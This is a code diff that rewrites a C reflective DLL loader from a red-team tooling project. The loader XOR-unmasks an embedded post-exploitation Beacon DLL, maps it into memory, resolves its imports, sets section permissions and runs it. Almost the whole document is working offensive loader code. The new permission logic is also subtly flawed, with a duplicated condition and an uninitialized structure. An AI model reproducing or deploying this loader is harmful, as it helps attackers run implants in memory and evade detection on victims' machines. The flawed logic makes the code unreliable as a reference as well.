@@ -1,172 +1,152 @@
 /*
- * Copyright (C) 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
+ * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
  *
- * This file is part of Tradecraft Garden
+ * Redistribution and use in source and binary forms, with or without modification, are
+ * permitted provided that the following conditions are met:
  *
- * This program is free software; you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation; either version 2 of the License, or
- * (at your option) any later version.
+ * 1. Redistributions of source code must retain the above copyright notice, this list of
+ * conditions and the following disclaimer.
  *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
+ * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
+ * conditions and the following disclaimer in the documentation and/or other materials provided
+ * with the distribution.
  *
- *  You should have received a copy of the GNU General Public License along
- *  with this program; if not, see <https://www.gnu.org/licenses/>.
+ * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
+ * endorse or promote products derived from this software without specific prior written
+ * permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
+ * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+ * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+ * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+ * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
+ * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
+ * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-/* function prototypes */
-void ReflectiveLoader(void * loaderArguments);
+#include <windows.h>
+#include "tcg.h"
 
-/* this is the REAL entry point to this whole mess and it needs to go first! */
-__attribute__((noinline, no_reorder)) void go(void * loaderArguments) {
-	ReflectiveLoader(loaderArguments);
-}
-
-/*
- * loader.h is a refactored Reflective Loader and some macros/definitions we need.
- * it has several functions intended to be used across loaders.
- */
-#include "loaderdefs.h"
-#include "loader.h"
-
-/* build a table of functions we need/want */
-#define WIN32_FUNC( x ) __typeof__( x ) * x
-
-typedef struct {
-	WIN32_FUNC(LoadLibraryA);
-	WIN32_FUNC(GetModuleHandleA);
-	WIN32_FUNC(GetProcAddress);
-	WIN32_FUNC(VirtualProtect);
-	WIN32_FUNC(VirtualAlloc);
-	WIN32_FUNC(VirtualFree);
-} WIN32FUNCS;
+DECLSPEC_IMPORT LPVOID WINAPI  KERNEL32$VirtualAlloc   (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+DECLSPEC_IMPORT BOOL   WINAPI  KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+DECLSPEC_IMPORT BOOL   WINAPI  KERNEL32$VirtualFree    (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+DECLSPEC_IMPORT int    WINAPIV MSVCRT$strncmp          (const char * string1, const char * string2, size_t count);
 
 __typeof__(GetModuleHandleA) * pGetModuleHandle __attribute__((section(".text")));
 __typeof__(GetProcAddress)   * pGetProcAddress  __attribute__((section(".text")));
 
-void findNeededFunctions(WIN32FUNCS * funcs) {
-
-	/*
-	 * use pGetModuleHandle & pGetProcAddress
-	 * instead of walking the EAT (findFunctionByHash)
-	*/
-
-	funcs->GetModuleHandleA = (__typeof__(GetModuleHandleA) *) pGetModuleHandle;
-	funcs->GetProcAddress   = (__typeof__(GetProcAddress)   *) pGetProcAddress;
-
-	char k32[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', 0 };
-	HMODULE hModule = funcs->GetModuleHandleA(k32);
-
-	char ll[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
-	funcs->LoadLibraryA = (__typeof__(LoadLibraryA) *) funcs->GetProcAddress(hModule, ll);
-
-	char va[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
-	funcs->VirtualAlloc = (__typeof__(VirtualAlloc) *) funcs->GetProcAddress(hModule, va);
-
-	char vp[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
-	funcs->VirtualProtect = (__typeof__(VirtualProtect) *) funcs->GetProcAddress(hModule, vp);
-
-	char vr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0 };
-	funcs->VirtualFree = (__typeof__(VirtualFree) *) funcs->GetProcAddress(hModule, vr);
+char * resolve(char * module, char * function) {
+    HANDLE hModule = pGetModuleHandle(module);
+    if (hModule == NULL) {
+        hModule = LoadLibraryA(module);
+    }
+    return (char *)pGetProcAddress(hModule, function);
 }
 
-/*
- * This is the Crystal Palace convention for getting ahold of data linked with this loader.
- */
-char __BEACON_DLL[0] __attribute__((section("postex_dll")));
-char __XOR_KEY[0] __attribute__((section("xor_key")));
+#define GETRESOURCE(x) (char *)&x
 
-char * getLoaderStart() {
-	return (char *)&go;
-}
+char _DLL_[0] __attribute__((section("dll")));
+char _KEY_[0] __attribute__((section("key")));
 
-char * findPostexDLL() {
-	return (char *)&__BEACON_DLL;
-}
-
-char * findXorKey() {
-	return (char *)&__XOR_KEY;
-}
-
-/*
- * Our embedded resources are masked, so we need to unmask them.
- */
 typedef struct {
-	int   length;
-	char  value[];
-} _RESOURCE;
+    int   length;
+    char  value[];
+} RESOURCE;
 
-char * unmaskAndLoad(WIN32FUNCS * funcs) {
-	char      * srcData = findPostexDLL();
-	char      * dst;
-	
-	_RESOURCE * key;
-	_RESOURCE * src;
+typedef struct {
+   char * start;
+   DWORD  length;
+   DWORD  offset;
+} RDATA_SECTION;
 
-	/* parse our preplen + xor'd $KEY and our masked data too */
-	key = (_RESOURCE *)findXorKey();
-	src = (_RESOURCE *)srcData;
+void FixSectionPermissions(DLLDATA * dll, char * dst, RDATA_SECTION * rdata)
+{
+    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
+    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
+    void                  * sectionDst       = NULL;
+    DWORD                   sectionSize      = 0;
+    DWORD                    newProtection     = 0;
+    DWORD                    oldProtection     = 0;
 
-	/* allocate memory for our unmasked content */
-	dst = funcs->VirtualAlloc(NULL, src->length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);
 
-	/* unmask it */
-	for (int x = 0; x < src->length; x++) {
-		dst[x] = src->value[x] ^ key->value[x % key->length];
-	}
+    for (int i = 0; i < numberOfSections; i++)
+    {
+        sectionDst  = dst + sectionHdr->VirtualAddress;
+        sectionSize = sectionHdr->SizeOfRawData;
 
-	return dst;
+        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
+            newProtection = PAGE_WRITECOPY;
+        }
+        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) {
+            newProtection = PAGE_READONLY;
+        }
+        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
+            newProtection = PAGE_READWRITE;
+        }
+        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+            newProtection = PAGE_EXECUTE;
+        }
+        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
+            newProtection = PAGE_EXECUTE_WRITECOPY;
+        }
+        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
+            newProtection = PAGE_EXECUTE_READ;
+        }
+        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
+            newProtection = PAGE_EXECUTE_READWRITE;
+        }
+
+        KERNEL32$VirtualProtect(sectionDst, sectionSize, newProtection, &oldProtection);
+        
+        if (MSVCRT$strncmp((char *)sectionHdr->Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0) {
+            rdata->start  = sectionDst;
+            rdata->length = sectionSize;
+            rdata->offset = dll->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
+        }
+
+        sectionHdr++;
+    }
 }
 
-/*
- * Our reflective loader itself, have fun, go nuts!
- */
-void ReflectiveLoader(void * loaderArguments) {
-	char        * loaderStart;
-	char        * rawDll;
-	char        * loadedDll;
-	
-	WIN32FUNCS    funcs;
-	DLLDATA       beaconData;
-	
-	RDATA_SECTION rdata;
+void go(void * loaderArguments)
+{
+    IMPORTFUNCS funcs;
+    funcs.LoadLibraryA   = LoadLibraryA;
+    funcs.GetProcAddress = GetProcAddress;
 
-	_memset(&rdata, 0, sizeof(RDATA_SECTION));
+    /* get the masked dll and key */
+    RESOURCE * dll = (RESOURCE *)GETRESOURCE(_DLL_);
+    RESOURCE * key = (RESOURCE *)GETRESOURCE(_KEY_);
 
-	/* get start of this loader */
-	loaderStart = getLoaderStart();
+    /* unmask and load into memory */
+    char * src = (char *)KERNEL32$VirtualAlloc(NULL, dll->length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    for (int i = 0; i < dll->length; i++) {
+        src[i] = dll->value[i] ^ key->value[i % key->length];
+    }
 
-	/* resolve Win32 functions */
-	findNeededFunctions(&funcs);
+    /* parse dll headers */
+    DLLDATA data;
+    ParseDLL(src, &data);
 
-	/* find Postex DLL appended to this loader */
-	rawDll = unmaskAndLoad(&funcs);
+    /* load it into new memory */
+    char * dst = (char *)KERNEL32$VirtualAlloc(NULL, SizeOfDLL(&data), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    LoadDLL(&data, src, dst);
+    ProcessImports(&funcs, &data, dst);
 
-	/* parse the Beacon DLL */
-	ParseDLL(rawDll, &beaconData);
+    RDATA_SECTION rdata;
+    FixSectionPermissions(&data, dst, &rdata);
 
-	/* allocate memory for Beacon */
-	loadedDll = funcs.VirtualAlloc(NULL, SizeOfDLL(&beaconData), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    /* get the entry point */
+    DLLMAIN_FUNC entryPoint = EntryPoint(&data, dst);
 
-	/* load Beacon into memory */
-	LoadDLL(&beaconData, rawDll, loadedDll);
+    /* free the unmasked copy */
+    KERNEL32$VirtualFree(src, 0, MEM_RELEASE);
 
-	/* process its imports */
-	ProcessImports((IMPORTFUNCS *)&funcs, &beaconData, loadedDll);
-
-	/* fix memory permissions and track each section */
-	FixSectionsAndTrackRdata((IMPORTFUNCS *)&funcs, &beaconData, loadedDll, &rdata);
-
-	/* get the entry point */
-	DLLMAIN_FUNC entryPoint = EntryPoint(&beaconData, loadedDll);
-
-	/* free the unmasked copy */
-	funcs.VirtualFree(rawDll, 0, MEM_RELEASE);
-
-	/* call it */
-	entryPoint((HINSTANCE)loadedDll, DLL_PROCESS_ATTACH, &rdata);
-	entryPoint((HINSTANCE)loaderStart, 0x04, loaderArguments);
+    /* call entry point */
+    entryPoint((HINSTANCE)dst, DLL_PROCESS_ATTACH, &rdata);
+    entryPoint((HINSTANCE)GETRESOURCE(go), 0x04, loaderArguments);
 }
